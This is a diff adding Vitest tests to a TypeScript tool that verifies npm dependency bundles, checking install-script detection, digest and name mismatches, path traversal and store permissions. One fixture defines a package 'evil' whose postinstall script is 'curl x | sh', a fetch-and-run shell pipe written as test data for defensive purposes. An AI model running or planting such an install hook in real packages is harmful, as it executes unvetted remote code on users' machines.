@@ -1,4 +1,13 @@
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import {
+  mkdirSync,
+  mkdtempSync,
+  readFileSync,
+  readdirSync,
+  rmSync,
+  statSync,
+  symlinkSync,
+  writeFileSync,
+} from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
@@ -199,6 +208,28 @@ describe('planLockfile', () => {
     expect(read.ok && read.plan.problems.production).toEqual([]);
   });
 
+  // Review of #55, failing input 1: a bundled (inBundle) entry the lockfile marks as scripted.
+  it('names an inBundle entry with install scripts, in its section', () => {
+    const read = planLockfile(
+      lockfile({
+        'node_modules/outer': {
+          version: '1.0.0',
+          resolved: resolvedFor('outer', '1.0.0'),
+          integrity: integrityOf(Buffer.from('o')),
+          bundleDependencies: ['native'],
+        },
+        'node_modules/outer/node_modules/native': {
+          version: '2.0.0',
+          inBundle: true,
+          hasInstallScript: true,
+        },
+      }),
+    );
+    expect(read.ok && read.plan.problems.production).toEqual([
+      'node_modules/outer/node_modules/native (native@2.0.0) has install scripts (bundled inside its parent); lifecycle scripts are disabled, so it cannot be installed',
+    ]);
+  });
+
   it('reads a v1 lockfile tree', () => {
     const data = Buffer.from('v1');
     const read = planLockfile(
@@ -250,6 +281,35 @@ describe('inspectPackageTarball', () => {
       ok: true,
       info: { installScripts: [] },
     });
+  });
+
+  // Review of #55, failing input 2: scripts in a package nested inside the tarball.
+  it('finds install scripts and binding.gyp in packages nested under node_modules in the tarball', async () => {
+    const caps = DEPENDENCY_BUNDLE_CAPS.maxUnpackedPackageBytes;
+    const nested = await packageTgz(
+      { name: 'outer', version: '1.0.0', bundledDependencies: ['evil', '@s/gyp'] },
+      {
+        'node_modules/evil/package.json': JSON.stringify({
+          name: 'evil',
+          version: '0.1.0',
+          scripts: { postinstall: 'curl x | sh' },
+        }),
+        'node_modules/@s/gyp/package.json': JSON.stringify({ name: '@s/gyp', version: '1.0.0' }),
+        'node_modules/@s/gyp/binding.gyp': '{}',
+        'lib/package.json': JSON.stringify({ scripts: { install: 'not a package root' } }),
+      },
+    );
+    const read = await inspectPackageTarball(nested, caps);
+    expect(read.ok && read.info.installScripts.sort()).toEqual([
+      'node_modules/@s/gyp: binding.gyp',
+      'node_modules/evil: postinstall',
+    ]);
+  });
+
+  it('counts prepare as an install script', async () => {
+    const prep = await packageTgz({ name: 'p', version: '1.0.0', scripts: { prepare: 'tsc' } });
+    const read = await inspectPackageTarball(prep, DEPENDENCY_BUNDLE_CAPS.maxUnpackedPackageBytes);
+    expect(read.ok && read.info.installScripts).toEqual(['prepare']);
   });
 
   it('refuses a tarball that unpacks past the cap', async () => {
@@ -550,6 +610,64 @@ describe('openDependencyBundle', () => {
     });
   });
 
+  it('writes nothing from a bundle whose digest does not match (no store left behind)', async () => {
+    const b = await build(await fixture());
+    const opened = await openDependencyBundle(ref(b.file, 'f'.repeat(64)), work);
+    expect(opened.ok).toBe(false);
+    expect(readdirSync(work)).toEqual([]);
+  });
+
+  it('removes the store on any other refusal too', async () => {
+    const r = await crafted([
+      { name: 'manifest.json', data: '{}' },
+      { name: '../escape.tgz', data: 'x' },
+    ]);
+    expect((await openDependencyBundle(r, work)).ok).toBe(false);
+    expect(readdirSync(work)).toEqual([]);
+  });
+
+  it.runIf(process.platform !== 'win32')('keeps verified tarballs in a 0700 store', async () => {
+    const b = await build(await fixture());
+    const opened = await openDependencyBundle(ref(b.file, b.sha256), work);
+    if (!opened.ok) throw new Error(opened.reason);
+    expect(statSync(opened.bundle.storeDir).mode & 0o777).toBe(0o700);
+  });
+
+  it('refuses a tarball whose package name is not the manifest name', async () => {
+    const other = await packageTgz({ name: 'other', version: '1.0.0' });
+    const sha512 = parseIntegrity(integrityOf(other))?.[0]?.hex as string;
+    const manifest: DependencyBundleManifest = {
+      schema: BUNDLE_SCHEMA,
+      app: 'testapp',
+      commit: COMMIT,
+      lockfileSha256: 'a'.repeat(64),
+      sections: {
+        production: makeSection({
+          status: 'ok',
+          packages: [
+            {
+              path: 'node_modules/left',
+              name: 'left',
+              version: '1.0.0',
+              resolved: resolvedFor('left', '1.0.0'),
+              integrity: integrityOf(other),
+              sha512,
+            },
+          ],
+        }),
+        dev: makeSection({ status: 'ok', packages: [] }),
+      },
+    };
+    const r = await crafted([
+      { name: 'manifest.json', data: JSON.stringify(manifest) },
+      { name: `tarballs/${sha512}.tgz`, data: other },
+    ]);
+    const opened = await openDependencyBundle(r, work);
+    expect(!opened.ok && opened.reason).toBe(
+      'dependency bundle tarball for node_modules/left is package other, not left',
+    );
+  });
+
   it('refuses a manifest whose section digest was edited', async () => {
     const fx = await fixture();
     const manifest = await manifestFor(fx);
@@ -586,6 +704,19 @@ describe('materializeNpmCache', () => {
       );
     expect(readFileSync(at(left as { algo: string; hex: string })).length).toBeGreaterThan(0);
     expect(() => readFileSync(at(right as { algo: string; hex: string }))).toThrow();
+  });
+
+  it('re-hashes each tarball as it copies it, so a store file changed after opening is refused', async () => {
+    const fx = await fixture();
+    const b = await build(fx);
+    const opened = await openDependencyBundle(ref(b.file, b.sha256), work);
+    if (!opened.ok) throw new Error(opened.reason);
+    for (const name of readdirSync(opened.bundle.storeDir)) {
+      writeFileSync(join(opened.bundle.storeDir, name), 'swapped after verification');
+    }
+    await expect(
+      materializeNpmCache(opened.bundle, ['production'], join(work, 'cache')),
+    ).rejects.toThrow(/changed after verification/);
   });
 });
 
